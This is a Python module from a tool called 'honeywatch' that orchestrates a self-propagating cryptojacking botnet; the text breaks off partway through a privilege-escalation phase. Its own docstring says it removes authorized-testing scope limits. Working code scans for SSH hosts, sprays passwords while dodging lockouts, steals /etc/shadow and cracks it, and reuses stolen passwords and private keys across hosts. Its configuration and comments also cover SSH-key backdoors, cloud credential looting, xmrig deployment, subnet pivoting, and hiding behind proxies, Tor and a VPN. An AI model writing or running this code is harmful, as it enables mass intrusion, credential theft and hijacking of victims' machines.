"""Autonomous cryptojacker chain orchestrator for honeywatch.

This is the kill-chain engine that turns honeywatch from a tool collection
into a self-running botnet. It ports NetAttackAI's phase + capability model
but drops the authorized-testing guardrails: no scope gate, no read-only
default, business-hours + source-rotation opsec baked in, and it loops on
*growth* -- every pivot that surfaces new hosts feeds back into enumeration.

The chain (each phase consumes artifacts the previous phase produced, kept in
the shared SQLite store so a killed run resumes from what's already known):

    recon        scan + score real SSH hosts              -> hosts
    enumerate    auth-method precheck on real hosts       -> sprayable hosts
    spray        lockout-safe password spray              -> credentials
    foothold     verify a cred by grabbing /etc/shadow    -> footholds
    escalate     offline hashcrack of grabbed shadows     -> more credentials
    persist      deploy xmrig via cracked passwords       -> deployed fleet
    pivot        discover adjacent subnets from footholds  -> new hosts -> loop

State lives in :class:`ChainState`; the store is the durable backing. The
orchestrator never raises -- a phase that fails records its error and the
chain continues to the next phase (a dead scanner should not kill a foothold
you already have).
"""

from __future__ import annotations

import asyncio
import ipaddress
import os
import re
import socket
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable

from honeywatch.opsec import ProxyPool, spoofed_ssh_banner_for_target

__all__ = [
    "ChainConfig",
    "ChainPhase",
    "ChainState",
    "ChainOrchestrator",
    "run_chain",
]


class ChainPhase(str, Enum):
    ROUND = "round"   # meta: round delimiter, not a network phase
    RECON = "recon"
    ENUMERATE = "enumerate"
    SPRAY = "spray"
    FOOTHOLD = "foothold"
    PRIVESC = "privesc"  # local privilege escalation before shadow grab
    ESCALATE = "escalate"
    LOOT = "loot"        # credential + cloud metadata exfil from footholds
    PERSIST = "persist"
    PIVOT = "pivot"


@dataclass
class ChainConfig:
    """Operator inputs that drive one autonomous run."""

    # Targets for the recon phase (CIDRs / IPs). If empty, recon is skipped and
    # the chain works off whatever the store already holds (resume / pivot-only).
    targets: list[str] = field(default_factory=list)
    scan_tool: str = "masscan"
    scan_rate: int | None = None
    max_hosts: int | None = None

    # Spray population.
    users: list[str] = field(default_factory=list)
    user_file: str | None = None
    passwords: list[str] = field(default_factory=list)
    password_file: str | None = None
    # Deploy payload (cryptojacker). The chain only *enqueues* operations; a
    # separately-launched `honeywatch worker` picks up the tasks and executes
    # them, so the worker's --exec-mode (not the chain's) governs how a deploy
    # actually runs.
    payload_id: str = "xmrig"
    pool: str = ""
    wallet: str = ""
    worker: str = "honeywatch"
    threads: int = 0
    tls: bool = False
    evasion: list[str] = field(default_factory=list)

    # Offline hash cracking.
    hashcrack_wordlist: str = ""  # empty = use bundled default
    hashcrack_tool: str = "hashcat"

    # Opsec knobs (threaded into every network-touching phase).
    business_hours: bool = False
    proxy_file: str | None = None
    jump_file: str | None = None
    tor: bool = False
    tor_port: int = 9050
    delay: float = 0.0
    jitter: float = 0.5
    lockout_delay: float = 0.0
    host_concurrency: int = 8
    min_confidence: float = 0.7
    target_labels: set[str] = field(default_factory=lambda: {"real", "likely_real"})

    # Loop control.
    max_rounds: int = 3
    skip_vpn_check: bool = False

    # Operator's SSH public key — installed into every foothold's
    # authorized_keys so access survives a password change. This is the
    # persistence primitive real cryptojackers use to keep access after the
    # victim rotates creds. Empty = skip the SSH key backdoor payload.
    backdoor_key: str = ""

    # Operator config TOML, threaded into recon's load_config so scan tuning
    # from config.toml (ports, AI, scanner opts) is honored through the chain,
    # not just via `honeywatch scan`. None = env / ./config.toml / defaults.
    config_path: str | None = None

    # Run id for durable resume state (chain_state table). Defaults to a
    # per-process stamp when unset; pass an explicit id to resume a previous
    # run across process restarts.
    run_id: str = ""

    # Where recovered shadows land + where pivots read from.
    db_path: str = "honeywatch.db"
    shadow_stash: str = ".honeywatch/shadow_stash"
    vault_passphrase: str | None = None


@dataclass
class ChainState:
    """Live state threaded across phases; the store is the durable backing."""

    round: int = 0
    hosts: list[tuple[str, int]] = field(default_factory=list)        # discovered
    sprayable: list[tuple[str, int]] = field(default_factory=list)    # password-auth
    credentials: list[dict] = field(default_factory=list)             # recovered
    footholds: list[tuple[str, int, str, str]] = field(default_factory=list)  # ip,port,user,pass
    # Targets with a deploy task queued in the C2 store this run. The chain
    # cannot know synchronous deploy outcome -- that is the worker's job -- so
    # this is honestly "enqueued", not "deployed".
    enqueued: list[tuple[str, int]] = field(default_factory=list)
    # Every subnet the chain has pivoted into across all rounds (accumulates).
    pivoted_subnets: list[str] = field(default_factory=list)
    # Loot harvested from footholds: {ip: LootResult.summary()} so the run
    # summary reflects what was exfiltrated each round.
    loot: list[dict] = field(default_factory=list)
    # Cloud credentials recovered via IMDS (highest-value loot — these can
    # spawn fresh infrastructure to mine on).
    cloud_creds: list[dict] = field(default_factory=list)
    # SSH private keys recovered from footholds (re-used across the fleet
    # for key-based pivoting the spray phase can't reach).
    recovered_ssh_keys: list[str] = field(default_factory=list)
    # Footholds that already had their loot harvested this run (so we don't
    # re-SFTP the same files every round).
    looted_footholds: list[tuple[str, int]] = field(default_factory=list)
    # ARP neighbors discovered from footholds during pivot. Each entry is
    # (ip, mac, vendor) — the vendor is looked up from the MAC OUI table
    # to identify VMs (VMware, VirtualBox, QEMU/KVM, Hyper-V, Xen).
    arp_neighbors: list[tuple[str, str, str]] = field(default_factory=list)
    # CVE-prone packages discovered on footholds. Each entry is a dict with
    # (name, version, manager, cve_prone) — fed into vulnerability scoring.
    vulnerable_packages: list[dict] = field(default_factory=list)
    # Phases that completed successfully in this run. Used for durable resume
    # — a phase that crashed halfway is NOT in this list and will re-run.
    phases_completed: list[str] = field(default_factory=list)
    log: list[dict] = field(default_factory=list)
    stopped: bool = False
    stop_reason: str = ""

    def note(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.log.append({"phase": phase.value, "msg": msg, "round": self.round, **extra})


# --------------------------------------------------------------------------- #
# Small SSH exec helper (used by foothold verification + pivot discovery)
# --------------------------------------------------------------------------- #


def _ssh_exec(
    ip: str, port: int, user: str, password: str | None, key_path: str | None,
    command: str, timeout_s: float = 15.0,
) -> tuple[int | None, str, str | None]:
    """Run one command on a host via paramiko. Returns (rc, stdout, error)."""
    try:
        import paramiko  # type: ignore[import-not-found]
    except Exception as exc:
        return None, "", f"paramiko unavailable: {exc!r}"
    transport = None
    try:
        # Build the socket with an explicit connect timeout so a host that
        # blackholes the SYN (rather than refusing) cannot hold the foothold/
        # pivot phase indefinitely. paramiko.Transport((ip, port)) connects
        # with no timeout of its own.
        import socket as _socket

        sock = _socket.create_connection((ip, port), timeout=timeout_s)
        sock.settimeout(timeout_s)
        transport = paramiko.Transport(sock)
        banner = spoofed_ssh_banner_for_target(ip, port)
        transport._CLIENT_IDENTITY = banner
        transport.local_version = banner
        # set_timeout governs the banner exchange + auth window so a host that
        # accepts the TCP connect but never finishes the SSH handshake cannot
        # hang the foothold/pivot phase indefinitely.
        transport.set_timeout(timeout_s)
        transport.start_client(timeout=timeout_s)
        if key_path:
            pkey = paramiko.RSAKey.from_private_key_file(key_path)
            transport.auth_publickey(user, pkey)
        else:
            transport.auth_password(user, password or "")
        chan = transport.open_session()
        chan.settimeout(timeout_s)
        chan.exec_command(command)
        out = b""
        err = b""
        # Drain BOTH stdout and stderr until the channel closes. Reading only
        # stdout deadlocks a command that writes more than the pipe buffer to
        # stderr: the remote process blocks on a full stderr buffer while we sit
        # waiting on a stdout stream that never grows. Poll both streams against
        # an overall deadline so a hung command is cut off rather than looping.
        deadline = time.monotonic() + timeout_s
        while True:
            got = False
            if chan.recv_ready():
                out += chan.recv(4096)
                got = True
            if chan.recv_stderr_ready():
                err += chan.recv_stderr(4096)
                got = True
            if (chan.exit_status_ready()
                    and not chan.recv_ready()
                    and not chan.recv_stderr_ready()):
                break
            if not got:
                if time.monotonic() > deadline:
                    break
                time.sleep(0.01)
        rc = chan.recv_exit_status()
        text = out.decode("utf-8", "replace")
        if err:
            text += "\n[stderr]\n" + err.decode("utf-8", "replace")
        return rc, text, None
    except Exception as exc:
        return None, "", f"{type(exc).__name__}: {exc}"
    finally:
        if transport is not None:
            try:
                transport.close()
            except Exception:
                pass


def _adjacent_subnets(interfaces_text: str) -> list[str]:
    """Parse `ip -o -4 addr` (or `ifconfig`) output into subnets the host sits on.

    The pivot command is ``ip -o -4 addr || ifconfig``, so this must handle both
    shapes: modern ``ip`` (``inet 10.0.0.5/24 ...``) and the two ``ifconfig``
    forms — new (``inet 10.0.0.5 netmask ...``) and legacy net-tools
    (``inet addr:10.0.0.5  Bcast:...  Mask:...``).

    Finding #8: reads the actual CIDR from the ``ip`` output instead of
    forcing /24.  A host sitting in a /16 corporate network now pivots into
    the full /16 (capped at /20 to avoid scanning a /8 — too loud and too
    slow).  When the netmask isn't available (ifconfig-only hosts), falls
    back to /24.
    """
    nets: list[str] = []
    for line in interfaces_text.splitlines():
        # format: "2: eth0    inet 10.0.0.5/24 brd ... scope global eth0"
        if " inet " not in line:
            continue
        try:
            inet_part = line.split(" inet ", 1)[1].split()[0]
            # Legacy ifconfig: "inet addr:10.0.0.5" -> first token is "addr:10.0.0.5".
            if inet_part.startswith("addr:"):
                inet_part = inet_part[len("addr:"):]
            ip_cidr = inet_part.split("/")[0]
        except (IndexError, ValueError):
            continue
        if ip_cidr.startswith(("127.", "169.254.")):
            continue
        # Read the actual CIDR prefix from the ip -o -4 addr output. The
        # format is "10.0.0.5/24" — the /N is the host's actual netmask.
        # When the prefix isn't available (ifconfig-only hosts), fall back
        # to /24.
        cidr = 24  # default fallback
        if "/" in inet_part:
            try:
                cidr = int(inet_part.split("/")[1])
            except (ValueError, IndexError):
                pass
        # Cap at /20 to avoid scanning a /8 from a foothold (too loud and
        # too slow). A /20 is 4096 hosts — large enough for a corporate
        # pivot, small enough to finish in a reasonable scan.
        if cidr < 20:
            cidr = 20
        try:
            net = ipaddress.ip_network(f"{ip_cidr}/{cidr}", strict=False)
        except ValueError:
            continue
        nets.append(str(net))
    # de-dup, keep order
    seen: set[str] = set()
    out: list[str] = []
    for n in nets:
        if n not in seen:
            seen.add(n)
            out.append(n)
    return out


def _parse_arp_neighbors(arp_text: str) -> list[tuple[str, str, str]]:
    """Parse ``ip neigh`` or ``arp -n`` output into ``(ip, mac, vendor)`` tuples.

    The pivot command is ``ip neigh || arp -n``, so this must handle both:

    * ``ip neigh`` — ``10.0.0.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE``
    * ``arp -n`` — ``host 10.0.0.1 (10.0.0.1) at aa:bb:cc:dd:ee:ff [ether] on eth0``
      or the older format: ``? (10.0.0.1) at aa:bb:cc:dd:ee:ff on eth0``

    Vendor is looked up from the MAC OUI prefix against the VM-detection table
    (``_VM_OUIS`` from ``scorers.py``) so pivot can prioritize real hardware
    over VMs and the chain can tag VM footholds for the looter.
    """
    from honeywatch.scorers import _VM_OUIS

    neighbors: list[tuple[str, str, str]] = []
    for line in arp_text.splitlines():
        line = line.strip()
        if not line:
            continue
        # Skip header lines from `arp -n`.
        if line.startswith(("IP address", "Address", "HWaddress")):
            continue
        # ip neigh format: "10.0.0.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE"
        # Lines without lladdr are stale/incomplete entries — skip them.
        ip = mac = ""
        if "lladdr" in line:
            parts = line.split()
            ip = parts[0] if parts else ""
            idx = parts.index("lladdr") + 1 if "lladdr" in parts else -1
            if idx < len(parts):
                mac = parts[idx]
        # arp -n format: "host (10.0.0.1) at aa:bb:cc:dd:ee:ff [ether] on eth0"
        # or: "? (10.0.0.1) at aa:bb:cc:dd:ee:ff on eth0"
        elif " at " in line:
            # Extract IP from parenthesized group
            lp = line.find("(")
            rp = line.find(")", lp)
            if lp != -1 and rp != -1:
                ip = line[lp + 1 : rp]
            at_idx = line.find(" at ")
            if at_idx != -1:
                rest = line[at_idx + 4 :].split()
                mac = rest[0] if rest else ""
        if not ip or not mac or mac == "00:00:00:00:00:00" or "<incomplete>" in line:
            continue
        # Normalize MAC to lowercase with colon separators for OUI lookup.
        mac_lower = mac.lower().replace("-", ":")
        oui = mac_lower[:8]  # "aa:bb:cc"
        vendor = _VM_OUIS.get(oui, "")
        neighbors.append((ip, mac_lower, vendor))
    # De-dup by IP, keep order.
    seen: set[str] = set()
    out: list[tuple[str, str, str]] = []
    for ip, mac, vendor in neighbors:
        if ip not in seen:
            seen.add(ip)
            out.append((ip, mac, vendor))
    return out


# --------------------------------------------------------------------------- #
# Orchestrator
# --------------------------------------------------------------------------- #


class ChainOrchestrator:
    """Runs the autonomous cryptojacker chain, looping on growth."""

    def __init__(self, config: ChainConfig, on_phase: Callable | None = None):
        self.cfg = config
        self.state = ChainState()
        self.on_phase = on_phase
        self.pool = ProxyPool.from_files(proxy_file=config.proxy_file,
                                         jump_file=config.jump_file,
                                         tor=f"socks5://127.0.0.1:{config.tor_port}" if config.tor else None)
        self.bandit: UCB1Bandit | None = None

    # -- helpers -----------------------------------------------------------
    def _emit(self, phase: ChainPhase, msg: str, **extra) -> None:
        self.state.note(phase, msg, **extra)
        if self.on_phase:
            try:
                self.on_phase(phase, msg, self.state, **extra)
            except Exception:
                pass

    def _require_vpn(self, skip: bool) -> None:
        """Enforce the Mullvad VPN gate for the whole chain.

        Every network phase (spray, foothold, loot, pivot) does raw SSH/SFTP/
        IMDS that would expose the operator's real IP without a tunnel. The
        recon scanner has its own internal gate, but the other phases don't —
        this gate at :meth:`run` entry covers them all. Raises :class:`VpnError`
        when Mullvad is down and ``skip_vpn_check`` is False.
        """
        from honeywatch.vpn import DEFAULT_TIMEOUT, VpnError, require_mullvad

        if skip or self.cfg.skip_vpn_check:
            return
        if not require_mullvad(timeout=DEFAULT_TIMEOUT, quiet=True):
            raise VpnError(
                "Mullvad VPN is not connected. The botnet chain runs raw "
                "SSH/SFTP/IMDS in every phase — connect Mullvad first, or pass "
                "--skip-vpn-check / set skip_vpn_check=True for controlled "
                "offline testing."
            )

    def _store(self):
        from honeywatch.store import Store
        return Store(self.cfg.db_path, vault_passphrase=self.cfg.vault_passphrase)

    def _reconcile_from_store(self) -> None:
        """Rebuild in-memory state from the durable store (source of truth).

        On resume, the serialized ChainState may be stale — the store was
        being written to continuously during the run and reflects what actually
        happened. The store wins on conflict.

        Fields NOT tracked by the store (pivoted_subnets, recovered_ssh_keys,
        cloud_creds, loot, looted_footholds, enqueued) come from the serialized
        state_json cache. If the process crashed mid-loot, these fields may be
        slightly stale — the next round re-discovers them idempotently (pivot
        re-discovers subnets, loot re-SFTPs any missing stash directories).
        """
        store = self._store()

        # credentials: store is truth. A credential row exists for every
        # successful crack/spray, so this rebuilds the full set.
        store_creds = store.query_credentials(limit=1_000_000)
        self.state.credentials = store_creds

        # footholds: reconstructed from the dedicated footholds table, NOT
        # from the credentials table. A foothold is a credential that was
        # VERIFIED by phase_foothold (actual SSH access, shadow grab). Not
        # every cracked password is a foothold — service accounts with
        # /usr/sbin/nologin are credentials but not footholds.
        foothold_rows = store.query_footholds(limit=1_000_000)
        self.state.footholds = [
            (r["ip"], int(r["port"]), r["user"], r["password"] or "")
            for r in foothold_rows
        ]
        # If the footholds table is empty (first run or pre-v0.3 store), fall
        # back to the serialized footholds from the state JSON cache. This
        # provides backward compat — older stores don't have the footholds table.

        # hosts: rebuild from scored hosts in the store.
        rows = store.query(limit=1_000_000, min_confidence=0.0)
        self.state.hosts = [(r["ip"], int(r["port"])) for r in rows]

        # sprayable: rebuild from scored hosts filtered by target labels and
        # confidence threshold. The actual "offers password auth" filter needs
        # the fingerprint data that the store doesn't preserve in query(), so
        # we take the stored sprayable list if available, otherwise use all
        # hosts at the configured confidence level.
        if not self.state.sprayable:
            label_rows = store.query(
                limit=1_000_000,
                min_confidence=self.cfg.min_confidence,
                labels=self.cfg.target_labels,
            )
            self.state.sprayable = [(r["ip"], int(r["port"])) for r in label_rows]

        # enqueued: rebuild from C2 store pending/running tasks.
        try:
            from honeywatch.c2.store import C2Store
            c2 = C2Store(self.cfg.db_path)
            pending = c2.query_tasks(status="pending")
            running = c2.query_tasks(status="running")
            seen: set[tuple[str, int]] = set()
            for t in pending + running:
                key = (t.target.ip, t.target.port)
                if key not in seen:
                    self.state.enqueued.append(key)
                    seen.add(key)
        except Exception:
            pass  # C2 store may not exist yet — enqueued stays from state cache

        # looted_footholds: verify stash directories actually have files.
        # A crash mid-SFTP could leave an IP in looted_footholds with an empty
        # stash — remove those so they get re-looted.
        if self.state.looted_footholds and self.cfg.shadow_stash:
            verified: list[tuple[str, int]] = []
            for ip, port in self.state.looted_footholds:
                safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
                stash = os.path.join(self.cfg.shadow_stash, safe_ip)
                if os.path.isdir(stash) and os.listdir(stash):
                    verified.append((ip, port))
                else:
                    self._emit(ChainPhase.LOOT,
                               f"stash for {ip}:{port} incomplete — will re-loot")
            self.state.looted_footholds = verified

    @property
    def _sem(self) -> asyncio.Semaphore:
        """Per-loop concurrency semaphore (host_concurrency).

        A semaphore binds to the event loop that first uses it. Phases may be
        driven from different loops (the engine's own loop, a test's
        ``asyncio.run``, the agent's worker thread), so we recreate it per
        loop instead of caching one across loops.
        """
        loop = asyncio.get_running_loop()
        cached = self.__dict__.get("_sem_cache")
        if cached is not None and getattr(cached, "_loop", None) is loop:
            return cached
        sem = asyncio.Semaphore(max(1, self.cfg.host_concurrency))
        self.__dict__["_sem_cache"] = sem
        return sem

    # -- phases ------------------------------------------------------------
    async def phase_recon(self) -> None:
        self._emit(ChainPhase.RECON, f"scanning {len(self.cfg.targets)} target(s)")
        if not self.cfg.targets:
            self._emit(ChainPhase.RECON, "no targets; working off stored hosts")
            return
        from honeywatch.config import load_config
        from honeywatch.pipeline import Pipeline

        cfg = load_config(self.cfg.config_path)
        store = self._store()
        pipeline = Pipeline(cfg, store=store)
        try:
            scores = await pipeline.scan(
                targets=list(self.cfg.targets),
                tool=self.cfg.scan_tool,
                rate=self.cfg.scan_rate or 1000,
                max_hosts=self.cfg.max_hosts,
                skip_vpn_check=self.cfg.skip_vpn_check,
            )
            self._emit(ChainPhase.RECON, f"scored {len(scores)} hosts")
        except Exception as exc:
            self._emit(ChainPhase.RECON, f"recon failed: {type(exc).__name__}: {exc}")

    async def phase_enumerate(self) -> None:
        store = self._store()
        # Label filtering pushed into SQL (uses idx_hosts_label) instead of
        # pulling up to 100k rows and filtering labels in Python — the old
        # pattern silently truncated at 100k and loaded every row into memory.
        rows = store.query(
            limit=1_000_000, min_confidence=self.cfg.min_confidence,
            labels=self.cfg.target_labels,
        )
        hosts = [(r["ip"], int(r["port"])) for r in rows]
        # de-dup
        seen: set = set()
        self.state.hosts = [h for h in hosts if not (h in seen or seen.add(h))]

        # UCB1 bandit: reorder hosts by SSH banner score so historically
        # high-yield banners are probed first. Hosts without a stored
        # banner get score -1.0 (end of list, original order).
        if self.bandit is not None and self.state.hosts:
            scores = self.bandit.scores()
            conn_enum = store._connect()
            try:
                # Batch query: fetch all host versions at once instead of
                # per-host queries (planet-scale: 1M+ hosts in one SELECT).
                hosts_flat = [c for h in self.state.hosts for c in h]
                placeholders = ",".join("(?,?)" for _ in self.state.hosts)
                rows = conn_enum.execute(
                    f"SELECT ip, port, version, banner FROM hosts "
                    f"WHERE (ip, port) IN ({placeholders})",
                    hosts_flat,
                ).fetchall()
                # Fall back to the banner column when version is empty
                # (pivot-discovered hosts may not have been scanned yet).
                banner_map = {(r[0], r[1]): r[2] or r[3] or "" for r in rows}
            finally:
                store._close(conn_enum)
            self.state.hosts.sort(
                key=lambda h: -scores.get(banner_map.get(h, ""), -1.0)
            )
            self._emit(ChainPhase.ENUMERATE,
                        f"bandit reordered {len(self.state.hosts)} host(s)")

        self._emit(ChainPhase.ENUMERATE, f"{len(self.state.hosts)} real/likely hosts")

        from honeywatch.opsec import auth_methods

        probe_user = self.cfg.users[0] if self.cfg.users else "root"
        # Concurrent auth-method precheck: serial probing is the bottleneck on
        # planet-scale host lists (every other network phase is already
        # concurrent). auth_methods never raises, so gather is safe. Bound the
        # fan-out with the shared chain semaphore (host_concurrency) so a
        # million-host enumerate doesn't try to hand a million threads to the
        # default executor at once.
        if self.state.hosts:
            sem = self._sem

            async def _one(ip: str, port: int):
                async with sem:
                    return await asyncio.to_thread(
                        auth_methods, ip, port, probe_user
                    )

            ams = await asyncio.gather(
                *(_one(ip, port) for ip, port in self.state.hosts)
            )
        else:
            ams = []
        sprayable: list[tuple[str, int]] = []
        for (ip, port), am in zip(self.state.hosts, ams):
            if am.offers_password:
                sprayable.append((ip, port))
            # unreachable hosts stay in `hosts` but aren't sprayable
        self.state.sprayable = sprayable
        self._emit(ChainPhase.ENUMERATE,
                   f"{len(sprayable)} hosts offer password auth "
                   f"({len(self.state.hosts) - len(sprayable)} skipped)")

    async def phase_spray(self) -> None:
        if not self.state.sprayable:
            self._emit(ChainPhase.SPRAY, "no sprayable hosts; skipping")
            return
        from honeywatch.spray import (
            SprayHost,
            SprayPlan,
            spray_plan,
        )
        from honeywatch.opsec import ProxyPool
        store = self._store()

        users = self.cfg.users or self._load_users()
        passwords = self.cfg.passwords or self._load_passwords() or \
            ["Summer2024!", "Winter2024!", "Changeme123", "Welcome1"]

        # Fleet growth (round >= 2): re-spray every recovered password across
        # the current sprayable set. Password reuse across a fleet is the
        # blackhat growth primitive -- a cred cracked on one box often opens
        # others. Mirrors `honeywatch spray --reuse-creds`.
        if self.state.round > 1:
            recovered = {c.get("password")
                         for c in store.query_credentials(limit=100000)
                         if c.get("password")}
            recovered -= set(passwords)
            if recovered:
                passwords = list(recovered) + list(passwords)
                self._emit(ChainPhase.SPRAY,
                           f"reuse-creds: {len(recovered)} recovered password(s) prepended")

        hosts = [SprayHost(ip=ip, port=port, users=list(users))
                 for ip, port in self.state.sprayable]
        pool = ProxyPool.from_files(proxy_file=self.cfg.proxy_file,
                                    jump_file=self.cfg.jump_file,
                                    tor=f"socks5://127.0.0.1:{self.cfg.tor_port}" if self.cfg.tor else None)
        all_creds: list[dict] = []
        all_spray_results: list = []
        for pw in passwords:
            self._emit(ChainPhase.SPRAY, f"round password={pw!r} against "
                       f"{len(hosts)} host(s)")
            plan = SprayPlan(
                password=pw,
                hosts=list(hosts),
                delay=self.cfg.delay,
                jitter=self.cfg.jitter,
                lockout_delay=self.cfg.lockout_delay,
                business_hours=self.cfg.business_hours,
                max_user_attempts=5,  # lockout-safe: stop after 5 users/round
            )
            res = await spray_plan(
                plan, pool=pool, host_concurrency=self.cfg.host_concurrency,
            )
            all_spray_results.extend(res)
            for r in res:
                if r.success:
                    cred = {"ip": r.ip, "port": r.port, "user": r.user,
                            "password": r.password}
                    all_creds.append(cred)
                    store.upsert_credential(
                        r.ip, r.port, r.user or "", r.password,
                        attempts=r.attempts, source="chain-spray")
        # Accumulate unique credentials across rounds.
        seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
        for c in all_creds:
            key = (c["ip"], c["port"], c["user"], c["password"])
            if key not in seen:
                self.state.credentials.append(c)
                seen.add(key)
        self._emit(ChainPhase.SPRAY, f"recovered {len(all_creds)} credential(s) this round "
                    f"({len(self.state.credentials)} total)")

        # UCB1 bandit: record spray outcomes per SSH banner so future rounds
        # prioritise banners with higher success rates. A credential found
        # counts as a success; every spray attempt against a host counts.
        if self.bandit is not None and all_spray_results:
            sprayed_ips = {r.ip for r in all_spray_results}
            success_ips = {r.ip for r in all_spray_results if r.success}
            # Batch query: fetch banners for all sprayed hosts at once.
            sprayed_hosts = [(ip, port) for ip, port in self.state.sprayable
                             if ip in sprayed_ips]
            if sprayed_hosts:
                bandit_store = self._store()
                conn = bandit_store._connect()
                try:
                    hosts_flat = [c for h in sprayed_hosts for c in h]
                    placeholders = ",".join("(?,?)" for _ in sprayed_hosts)
                    rows = conn.execute(
                        f"SELECT ip, port, version, banner FROM hosts "
                        f"WHERE (ip, port) IN ({placeholders})",
                        hosts_flat,
                    ).fetchall()
                    # Fall back to banner when version is empty.
                    banner_map = {(r[0], r[1]): r[2] or r[3] or "" for r in rows}
                finally:
                    bandit_store._close(conn)
                for ip, port in sprayed_hosts:
                    sw = banner_map.get((ip, port), "")
                    if not sw:
                        continue
                    self.bandit.update(sw, ip in success_ips)
            try:
                self._store().save_learning_outcomes(self.bandit.arms)
            except Exception:
                pass

        # Key-spray round (Finding #5): try every recovered SSH private key
        # against every sprayable host. An operator's id_rsa on host A often
        # works on host B, C, D (especially in managed fleets with shared
        # Ansible keys). This is the highest-yield growth primitive after
        # password reuse — a single recovered key can open hundreds of hosts.
        if self.state.recovered_ssh_keys and self.state.round > 1:
            key_creds: list[dict] = []
            existing_footholds = {(f[0], f[1]) for f in self.state.footholds}
            # Try the key's original owner (from configured users) first, then
            # common service-account names. On managed fleets, recovered keys
            # often belong to service accounts (ansible, ubuntu, debian, git,
            # jenkins) — not root. Trying only root misses the highest-yield
            # key-reuse targets (Ansible-controlled fleets commonly share one
            # key across hundreds of hosts, all under the ansible user).
            if self.cfg.users:
                key_users = list(dict.fromkeys([*self.cfg.users, "root"]))
            else:
                key_users = ["root", "ansible", "ubuntu", "debian", "centos"]
            for key_path in self.state.recovered_ssh_keys:
                for ip, port in self.state.sprayable:
                    if (ip, port) in existing_footholds:
                        continue
                    for try_user in key_users:
                        rc, out, err = await asyncio.to_thread(
                            _ssh_exec, ip, port, try_user, None, key_path,
                            "id", 5.0,
                        )
                        if rc == 0:
                            key_creds.append({"ip": ip, "port": port,
                                              "user": try_user,
                                              "password": f"key:{key_path}"})
                            store.upsert_credential(
                                ip, port, try_user, f"key:{key_path}",
                                attempts=1, source="chain-key-spray",
                            )
                            break  # key works for this host — stop trying users
            if key_creds:
                key_seen = {(c["ip"], c["port"], c["user"], c["password"]) for c in self.state.credentials}
                for c in key_creds:
                    k = (c["ip"], c["port"], c["user"], c["password"])
                    if k not in key_seen:
                        self.state.credentials.append(c)
                        key_seen.add(k)
                self._emit(ChainPhase.SPRAY,
                           f"key-spray: {len(key_creds)} key-based foothold(s) "
                           f"recovered ({len(self.state.recovered_ssh_keys)} key(s) tried)")

    async def phase_foothold(self) -> None:
        """Verify each recovered cred by actually grabbing /etc/shadow.

        The per-cred SFTP grab is the slowest network op in the chain; the
        serial loop previously stalled a 1000-cred round for hours. Now the
        grabs fan out concurrently, bounded by the shared chain semaphore.
        """
        from honeywatch.hashcrack import grab_shadow

        store = self._store()
        creds = store.query_credentials(limit=100000)
        # Accumulate unique footholds across rounds (de-dup by ip,port,user) so
        # the chain summary reflects the whole run, not just the last round.
        existing = {(f[0], f[1], f[2]) for f in self.state.footholds}
        footholds: list[tuple[str, int, str, str]] = list(self.state.footholds)
        sem = self._sem

        async def _verify(c: dict) -> tuple[str, int, str, str] | None:
            ip, port, user, pw = c["ip"], int(c["port"]), c["user"], c.get("password")
            if not (user and pw):
                return None
            # Already confirmed in an earlier round -- never re-grab. Re-SFTPing
            # /etc/shadow from a box you already own is pure target-side noise.
            if (ip, port, user) in existing:
                return None
            async with sem:
                grab = await asyncio.to_thread(
                    grab_shadow, ip, port, user, pw,
                    stash_dir=self.cfg.shadow_stash,
                )
            if grab.get("shadow_path"):
                self._emit(ChainPhase.FOOTHOLD, f"foothold confirmed {ip}:{port} ({user})")
                return (ip, port, user, pw)
            if grab.get("error"):
                # auth worked for spray but not for shadow read (non-root); still
                # a usable shell even if /etc/shadow is denied.
                async with sem:
                    rc, out, err = await asyncio.to_thread(
                        _ssh_exec, ip, port, user, pw, None, "id"
                    )
                if rc == 0:
                    self._emit(ChainPhase.FOOTHOLD, f"foothold (shell only) {ip}:{port}")
                    return (ip, port, user, pw)
            return None

        results = await asyncio.gather(*(_verify(c) for c in creds))
        for r in results:
            if r is not None:
                footholds.append(r)
                # Persist the verified foothold so resume can reconstruct it
                # without re-verifying (phase_foothold is the slowest phase).
                store.upsert_foothold(
                    r[0], int(r[1]), r[2], r[3],
                    source="chain-foothold",
                )
        self.state.footholds = footholds
        self._emit(ChainPhase.FOOTHOLD, f"{len(footholds)} foothold(s)")

    async def _try_exploit(
        self,
        ip: str,
        port: int,
        user: str,
        pw: str | None,
        key_path: str | None,
        payload_id: str,
        timeout: float = 30.0,
    ) -> dict | None:
        """Try one exploit payload on a foothold. Returns result dict or None.

        Deploy the payload script via SSH and check for PRIVESC_SUCCESS. On
        success, attempt to grab /etc/shadow as root. Extracted from
        phase_privesc for testability and reduced nesting depth.
        """
        from honeywatch.payloads.registry import get_payload
        from honeywatch.payloads.scripts import render_payload_script

        try:
            payload = get_payload(payload_id)
            script = render_payload_script(payload, {})
        except Exception:
            return None
        rc_e, out_e, _ = await asyncio.to_thread(
            _ssh_exec, ip, port, user, pw, key_path,
            script, timeout,
        )
        if "PRIVESC_SUCCESS" in (out_e or ""):
            self._emit(ChainPhase.PRIVESC,
                       f"{ip}:{port} root via {payload_id}")
            rc_s, shadow_out, _ = await asyncio.to_thread(
                _ssh_exec, ip, port, user, pw, key_path,
                "sudo -n cat /etc/shadow 2>/dev/null", 10.0,
            )
            if not (rc_s == 0 and shadow_out and "$" in shadow_out):
                shadow_out = out_e if "$" in (out_e or "") else ""
            if shadow_out and "$" in shadow_out:
                safe_ip = ip.replace("/", "_").replace("\\", "_").replace("..", "_")
                stash = os.path.join(self.cfg.shadow_stash, safe_ip)
                os.makedirs(stash, exist_ok=True)
                with open(os.path.join(stash, "shadow"), "w") as f:
                    f.write(shadow_out)
            return {"ip": ip, "port": port, "result": out_e or "",
                    "root": True}
        return None

    async def phase_privesc(self) -> None:
        """Local privilege escalation recon on each foothold (Finding #3).

        Runs a lightweight privesc checklist via _ssh_exec on every foothold:
        sudo -l, SUID binaries, writable cron paths, kernel version, sudoers,
        docker group membership, writable /etc/passwd.  When a writable
        /etc/passwd or a passwordless sudo entry is found, the foothold is
        upgraded to root (user overwritten to "root") so the subsequent
        escalate phase can grab /etc/shadow.

